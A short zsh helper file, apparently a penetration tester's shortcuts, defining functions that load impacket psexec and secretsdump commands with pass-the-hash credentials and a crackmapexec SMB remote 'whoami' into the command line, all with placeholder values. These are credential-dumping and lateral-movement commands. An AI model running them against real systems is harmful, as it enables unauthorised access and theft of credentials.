nn_psexec(){
    print -z 'psexec.py -hashes aaaaa:bbbbb domain/user@target'
}
nn_secretsdump(){
    print -z 'secretsdump.py -hashes  aaaaa:bbbb domain/user@target'
}
nn_cme_smb(){
    print -z 'cme smb target --local-auth -u user -p password -x whoami'
}

